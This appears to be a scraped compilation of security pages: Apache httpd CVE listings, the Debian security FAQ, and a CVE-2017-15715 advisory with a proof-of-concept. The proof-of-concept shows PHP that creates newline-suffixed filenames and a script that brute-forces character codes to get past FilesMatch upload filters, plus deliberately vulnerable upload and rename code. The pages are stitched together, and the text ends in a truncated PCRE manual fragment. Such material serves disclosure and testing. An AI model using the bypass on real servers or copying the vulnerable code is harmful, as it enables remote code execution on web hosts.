# Fixed in Apache HTTP Server 2.4.62

### important: Apache HTTP Server: source code disclosure with handlers configured via AddType ([CVE-2024-40725](https://www.cve.org/CVERecord?id=CVE-2024-40725))

A partial fix for CVE-2024-39884 in the core of Apache HTTP Server 2.4.61 ignores some use of the legacy content-type based configuration of handlers. "AddType" and similar configuration, under some circumstances where files are requested indirectly, result in source code disclosure of local content. For example, PHP scripts may be served instead of interpreted.

Users are recommended to upgrade to version 2.4.62, which fixes this issue.

### important: Apache HTTP Server weakness in mod\_rewrite when first segment of substitution matches filesystem path. ([CVE-2024-38475](https://www.cve.org/CVERecord?id=CVE-2024-38475))

Improper escaping of output in mod\_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure.

Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected. Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.

### low: Apache HTTP Server: DoS in HTTP/2 with initial windows size 0 ([CVE-2023-43622](https://www.cve.org/CVERecord?id=CVE-2023-43622))

An attacker, opening a HTTP/2 connection with an initial window size of 0, was able to block handling of that connection indefinitely in Apache HTTP Server. This could be used to exhaust worker resources in the server, similar to the well known "slow loris" attack pattern.

This has been fixed in version 2.4.58, so that such connection are terminated properly after the configured connection timeout.

This issue affects Apache HTTP Server: from 2.4.55 through 2.4.57.

Users are recommended to upgrade to version 2.4.58, which fixes the issue.

### moderate: Apache HTTP Server: HTTP/2 stream memory not reclaimed right away on RST ([CVE-2023-45802](https://www.cve.org/CVERecord?id=CVE-2023-45802))

When a HTTP/2 stream was reset (RST frame) by a client, there was a time window were the request's memory resources were not reclaimed immediately. Instead, de-allocation was deferred to connection close. A client could send new requests and resets, keeping the connection busy and open and causing the memory footprint to keep on growing. On connection close, all resources were reclaimed, but the process might run out of memory before that.

This was found by the reporter during testing of CVE-2023-44487 (HTTP/2 Rapid Reset Exploit) with their own test client. During "normal" HTTP/2 use, the probability to hit this bug is very low. The kept memory would not become noticeable before the connection closes or times out.

Users are recommended to upgrade to version 2.4.58, which fixes the issue.

### important: HTTP request splitting with mod\_rewrite and mod\_proxy ([CVE-2023-25690](https://www.cve.org/CVERecord?id=CVE-2023-25690))

Some mod\_proxy configurations on Apache HTTP Server versions 2.4.0 through 2.4.55 allow a HTTP Request Smuggling attack.

Configurations are affected when mod\_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using variable substitution.

For example, something like:

RewriteEngine on

RewriteRule "^/here/(.\*)" "http://example.com:8080/elsewhere?$1"; [P]

ProxyPassReverse /here/ http://example.com:8080/

Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning.

A crafted URI sent to httpd configured as a forward proxy (ProxyRequests on) can cause a crash (NULL pointer dereference) or, for configurations mixing forward and reverse proxy declarations, can allow for requests to be directed to a declared Unix Domain Socket endpoint (Server Side Request Forgery).

This issue affects Apache HTTP Server 2.4.7 up to 2.4.51 (included).

### critical: Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.49 and 2.4.50 (incomplete fix of CVE-2021-41773) ([CVE-2021-42013](https://www.cve.org/CVERecord?id=CVE-2021-42013))

It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

### critical: Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 ([CVE-2021-41773](https://www.cve.org/CVERecord?id=CVE-2021-41773))

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

This issue is known to be exploited in the wild.

### important: NULL pointer dereference on specially crafted HTTP/2 request ([CVE-2021-31618](https://www.cve.org/CVERecord?id=CVE-2021-31618))

Apache HTTP Server protocol handler for the HTTP/2 protocol checks received request headers against the size limitations as configured for the server and used for the HTTP/1 protocol as well. On violation of these restrictions and HTTP response is sent to the client with a status code indicating why the request was rejected.

This rejection response was not fully initialised in the HTTP/2 protocol handler if the offending header was the very first one received or appeared in a a footer. This led to a NULL pointer dereference on initialised memory, crashing reliably the child process. Since such a triggering HTTP/2 request is easy to craft and submit, this can be exploited to DoS the server.

This issue affected mod\_http2 1.15.17 and Apache HTTP Server version 2.4.47 only. Apache HTTP Server 2.4.47 was never released.

### important: Push Diary Crash on Specifically Crafted HTTP/2 Header ([CVE-2020-9490](https://www.cve.org/CVERecord?id=CVE-2020-9490))

In Apache HTTP Server versions 2.4.20 to 2.4.43, a specially crafted value for the 'Cache-Digest' header in a HTTP/2 request would result in a crash when the server actually tries to HTTP/2 PUSH a resource afterwards. Configuring the HTTP/2 feature via "H2Push off" will mitigate this vulnerability for unpatched servers.

### low: Limited cross-site scripting in mod\_proxy error page ([CVE-2019-10092](https://www.cve.org/CVERecord?id=CVE-2019-10092))

A limited cross-site scripting issue was reported affecting the mod\_proxy error page. An attacker could cause the link on the error page to be malfomed and instead point to a page of their choice. This would only be exploitable where a server was set up with proxying enabled but was misconfigured in such a way that the Proxy Error page was displayed. We have taken this opportunity to also remove request data from many other in-built error messages. Note however this issue did not affect them directly and their output was already escaped to prevent cross-site scripting attacks.

### low: Out of bound write in mod\_authnz\_ldap when using too small Accept-Language values ([CVE-2017-15710](https://www.cve.org/CVERecord?id=CVE-2017-15710))

mod\_authnz\_ldap, if configured with AuthLDAPCharsetConfig, uses the Accept-Language header value to lookup the right charset encoding when verifying the user's credentials. If the header value is not present in the charset conversion table, a fallback mechanism is used to truncate it to a two characters value to allow a quick retry (for example, 'en-US' is truncated to 'en'). A header value of less than two characters forces an out of bound write of one NUL byte to a memory location that is not part of the string. In the worst case, quite unlikely, the process would crash which could be used as a Denial of Service attack. In the more likely case, this memory is already reserved for future use and the issue has no effect at all.

### moderate: Tampering of mod\_session data for CGI applications ([CVE-2018-1283](https://www.cve.org/CVERecord?id=CVE-2018-1283))

When mod\_session is configured to forward its session data to CGI applications (SessionEnv on, not the default), a remote user may influence their content by using a "Session" header. This comes from the "HTTP\_SESSION" variable name used by mod\_session to forward its data to CGIs, since the prefix "HTTP\_" is also used by the Apache HTTP Server to pass HTTP header fields, per CGI specifications. The severity is set to Moderate because "SessionEnv on" is not a default nor common configuration, it should be considered more severe when this is the case though, because of the possible remote exploitation.

When an unrecognized HTTP Method is given in an <Limit {method}> directive in an .htaccess file, and that .htaccess file is processed by the corresponding request, the global methods table is corrupted in the current worker process, resulting in erratic behaviour. This behavior may be avoided by listing all unusual HTTP Methods in a global httpd.conf RegisterHttpMethod directive in httpd release 2.4.25 and later. To permit other .htaccess directives while denying the <Limit > directive, see the AllowOverrideList directive. Source code patch (2.4) is at; CVE-2017-9798-patch-2.4.patch Source code patch (2.2) is at; CVE-2017-9798-patch-2.2.patch Note 2.2 is end-of-life, no further release with this fix is planned. Users are encouraged to migrate to 2.4.28 or later for this and other fixes.

### important: Uninitialized memory reflection in mod\_auth\_digest ([CVE-2017-9788](https://www.cve.org/CVERecord?id=CVE-2017-9788))

The value placeholder in [Proxy-]Authorization headers of type 'Digest' was not initialized or reset before or between successive key=value assignments. by mod\_auth\_digest. Providing an initial key with no '=' assignment could reflect the stale value of uninitialized pool memory used by the prior request, leading to leakage of potentially confidential information, and a segfault.

### important: ap\_get\_basic\_auth\_pw() Authentication Bypass ([CVE-2017-3167](https://www.cve.org/CVERecord?id=CVE-2017-3167))

Use of the ap\_get\_basic\_auth\_pw() by third-party modules outside of the authentication phase may lead to authentication requirements being bypassed. Third-party module writers SHOULD use ap\_get\_basic\_auth\_components(), available in 2.2.34 and 2.4.26, instead of ap\_get\_basic\_auth\_pw(). Modules which call the legacy ap\_get\_basic\_auth\_pw() during the authentication phase MUST either immediately authenticate the user after the call, or else stop the request immediately with an error response, to avoid incorrectly authenticating the current request.

### low: Padding Oracle in Apache mod\_session\_crypto ([CVE-2016-0736](https://www.cve.org/CVERecord?id=CVE-2016-0736))

Prior to Apache HTTP release 2.4.25, mod\_sessioncrypto was encrypting its data/cookie using the configured ciphers with possibly either CBC or ECB modes of operation (AES256-CBC by default), hence no selectable or builtin authenticated encryption. This made it vulnerable to padding oracle attacks, particularly with CBC. An authentication tag (SipHash MAC) is now added to prevent such attacks.

### n/a: HTTP\_PROXY environment variable "httpoxy" mitigation ([CVE-2016-5387](https://www.cve.org/CVERecord?id=CVE-2016-5387))

HTTP\_PROXY is a well-defined environment variable in a CGI process, which collided with a number of libraries which failed to avoid colliding with this CGI namespace. A mitigation is provided for the httpd CGI environment to avoid populating the "HTTP\_PROXY" variable from a "Proxy:" header, which has never been registered by IANA. This workaround and patch are documented in the ASF Advisory at asf-httpoxy-response.txt and incorporated in the 2.4.25 and 2.2.32 releases. Note: This is not assigned an httpd severity, as it is a defect in other software which overloaded well-established CGI environment variables, and does not reflect an error in HTTP server software.

### important: Apache HTTP Request Parsing Whitespace Defects ([CVE-2016-8743](https://www.cve.org/CVERecord?id=CVE-2016-8743))

Apache HTTP Server, prior to release 2.4.25 (and 2.2.32), accepted a broad pattern of unusual whitespace patterns from the user-agent, including bare CR, FF, VTAB in parsing the request line and request header lines, as well as HTAB in parsing the request line. Any bare CR present in request lines was treated as whitespace and remained in the request field member "the\_request", while a bare CR in the request header field name would be honored as whitespace, and a bare CR in the request header field value was retained the input headers array. Implied additional whitespace was accepted in the request line and prior to the ':' delimiter of any request header lines.

RFC7230 Section 3.5 calls out some of these whitespace exceptions, and section 3.2.3 eliminated and clarified the role of implied whitespace in the grammer of this specification. Section 3.1.1 requires exactly one single SP between the method and request-target, and between the request-target and HTTP-version, followed immediately by a CRLF sequence. None of these fields permit any (unencoded) CTL character whatsoever. Section 3.2.4 explicitly disallowed any whitespace from the request header field prior to the ':' character, while Section 3.2 disallows all CTL characters in the request header line other than the HTAB character as whitespace.

These defects represent a security concern when httpd is participating in any chain of proxies or interacting with back-end application servers, either through mod\_proxy or using conventional CGI mechanisms. In each case where one agent accepts such CTL characters and does not treat them as whitespace, there is the possiblity in a proxy chain of generating two responses from a server behind the uncautious proxy agent. In a sequence of two requests, this results in request A to the first proxy being interpreted as requests A + A' by the backend server, and if requests A and B were submitted to the first proxy in a keepalive connection, the proxy may interpret response A' as the response to request B, polluting the cache or potentially serving the A' content to a different downstream user-agent.

These defects are addressed with the release of Apache HTTP Server 2.4.25 and coordinated by a new directive; HttpProtocolOptions Strict which is the default behavior of 2.4.25 and later.

By toggling from 'Strict' behavior to 'Unsafe' behavior, some of the restrictions may be relaxed to allow some invalid HTTP/1.1 clients to communicate with the server, but this will reintroduce the possibility of the problems described in this assessment. Note that relaxing the behavior to 'Unsafe' will still not permit raw CTLs other than HTAB (where permitted), but will allow other RFC requirements to not be enforced, such as exactly two SP characters in the request line.

### low: ap\_some\_auth\_required API unusable ([CVE-2015-3185](https://www.cve.org/CVERecord?id=CVE-2015-3185))

A design error in the "ap\_some\_auth\_required" function renders the API unusuable in httpd 2.4.x. In particular the API is documented to answering if the request required authentication but only answers if there are Require lines in the applicable configuration. Since 2.4.x Require lines are used for authorization as well and can appear in configurations even when no authentication is required and the request is entirely unrestricted. This could lead to modules using this API to allow access when they should otherwise not do so. API users should use the new ap\_some\_authn\_required API added in 2.4.16 instead.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

Subject: CVE-2017-15715: <FilesMatch> bypass with a trailing newline in the file name

CVE-2017-15715: <FilesMatch> bypass with a trailing newline in the file name

Severity: Low

Vendor: The Apache Software Foundation

Versions Affected:
httpd 2.4.0 to 2.4.29

Description:
The expression specified in <FilesMatch> could match '$' to a newline character
in a malicious filename, rather than matching only the end of the filename.
This could be exploited in environments where uploads of some files are are
externally blocked, but only by matching the trailing portion of the filename.

Mitigation:
All httpd users should upgrade to 2.4.30 or later.

Credit:
The issue was discovered by Elar Lang - security.elarlang.eu

#### Description

In Apache httpd 2.4.0 to 2.4.29, when mod\_session is configured to forward its session data to CGI applications (SessionEnv on, not the default), a remote user may influence their content by using a "Session" header. This comes from the "HTTP\_SESSION" variable name used by mod\_session to forward its data to CGIs, since the prefix "HTTP\_" is also used by the Apache HTTP Server to pass HTTP header fields, per CGI specifications.

## Description

![](/images/2018/apache_httpd_server.png)

In Apache httpd 2.4.0 to 2.4.29, the expression specified in  could match '$' to a newline character in a malicious filename, rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are are externally blocked, but only by matching the trailing portion of the filename.

## CVE-2017-15715 Proof-of-Concept

### Apache configuration

Example configuration, Apache2 on Ubuntu default

```
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>

```

Simplified version - file name must END with .php (like recommended on [Apache documentation](https://httpd.apache.org/docs/2.4/mod/core.html#sethandler)):

```
<FilesMatch "\.php$">
    SetHandler application/x-httpd-php
</FilesMatch>

```

Entire point in demonstrated FilesMatch directive is: file can be executed as PHP program code if file name ENDS with .php (and ONLY .php) extension.

### Filename

```
<?php
file_put_contents('poc.php'.chr(10), '<?php phpinfo(); ?>');
?>

```

Access it via HTTP request: poc.php%0a

http://localohost/poc.php`%0a`

It means - FilesMatch accepted something extra.

The Reason behind this problem is probably in PCRE: <https://www.pcre.org/original/doc/html/pcreposix.html#SEC4>.

* Apache: [CVE-2017-15715](http://httpd.apache.org/security/vulnerabilities_24.html#CVE-2017-15715)

### Preconditions

* User need to control file name. At least in Apache+PHP combination I don't know how to upload file name with leading newline character, it means control over file name must come via "rename" functionality.
* For direct access with HTTP request, file must be located in public folder.

### Entire test-code

```
<?php

define('DIR_LOCAL_FOLDER', 'tmp/');
define('URL_LOCATION', 'http://localhost/extension/tmp/');

exec('mkdir '.DIR_LOCAL_FOLDER);

function testForCharCode($charcode) {

    $ucode = str_pad(dechex($charcode), 4, '0', STR_PAD_LEFT);
    $uchr = json_decode('"\u'.$ucode.'"');

    $local_file_name = 'test_'.$charcode.'.php'.$uchr;
    $url_file_name = 'test_'.$charcode.'.php'.rawurlencode($uchr);

    $info = 'chr('.$charcode.') / \u'.$ucode.' / '.rawurlencode($uchr);

    if (!@file_put_contents(DIR_LOCAL_FOLDER.$local_file_name, '<?php echo 50-40; ?>')) {
        echo '[E] Can not write file for chr('.$charcode.')'.$local_file_name, PHP_EOL;
        return false;
    }

    $url = URL_LOCATION.$url_file_name;
    $src = @file_get_contents($url);
    if (false === $src) {
        echo '[E] Can not read URL for '.$info.': '.$url, PHP_EOL;
        return false;
    }

    if ($src == '10') {
        echo '[+] PHP EXECUTION FROM '.$info.': '.$url, PHP_EOL;
        return true;
    }

    // echo '[-] No exec from '.$info.': '.$url, PHP_EOL;
    return false;
}

for($i = 1; $i < 1024*64; $i++) {
    testForCharCode($i);
}

exec('rm -rf '.DIR_LOCAL_FOLDER);

?>

```
## Example of vulnerable code

.php is blacklisted, application creates file and file name comes from user

```
<?php
// when just .php is blacklisted
if (isset($_REQUEST['filename']) && 'php' !== strtolower(pathinfo($_REQUEST['filename'], PATHINFO_EXTENSION))) {
    file_put_contents($_REQUEST['filename'], '<?php phpinfo(); ?>');
}
?>

```

.php is blacklisted, application allows user to rename file and file name comes from user

```
<?php
if (isset($_REQUEST['filename']) && 'php' !== strtolower(pathinfo($_REQUEST['filename'], PATHINFO_EXTENSION))) {
    rename('previous.txt', $_REQUEST['filename'], '<?php phpinfo(); ?>');
}
?>

```
## Suggestions

All httpd users should upgrade to 2.4.30 or later.

 **char \**errbuf*, size\_t *errbuf\_size*);**

**void regfree(regex\_t \**preg*);**

[DESCRIPTION](#TOC1)

This set of functions provides a POSIX-style API for the PCRE regular
expression 8-bit library. See the
[**pcreapi**](pcreapi.html)
documentation for a description of PCRE's native API, which contains much
additional functionality. There is no POSIX-style wrapper for PCRE's 16-bit
and 32-bit library.

The functions described here are just wrapper functions that ultimately call
the PCRE native API. Their prototypes are defined in the **pcreposix.h**
header file, and on Unix systems the library itself is called
**pcreposix.a**, so can be accessed by adding **-lpcreposix** to the
command for linking an application that uses them. Because the POSIX functions
call the native ones, it is also necessary to add **-lpcre**.

I have implemented only those POSIX option bits that can be reasonably mapped
to PCRE native options. In addition, the option REG\_EXTENDED is defined with
the value zero. This has no effect, but since programs that are written to the
POSIX interface often use it, this makes it easier to slot in PCRE as a
replacement library. Other POSIX options are not even defined.

There are also some other options that are not defined by POSIX. These have
been added at the request of users who want to make use of certain
PCRE-specific features via the POSIX calling interface.

When PCRE is called via these functions, it is only the API that is POSIX-like
in style. The syntax and semantics of the regular expressions themselves are
still those of Perl, subject to the setting of various PCRE options, as
described below. "POSIX-like in style" means that the API approximates to the
POSIX definition; it is not fully POSIX-compatible, and in multi-byte encoding
domains it is probably even less compatible.

The header for these functions is supplied as **pcreposix.h** to avoid any
potential clash with other POSIX libraries. It can, of course, be renamed or
aliased as **regex.h**, which is the "correct" name. It provides two
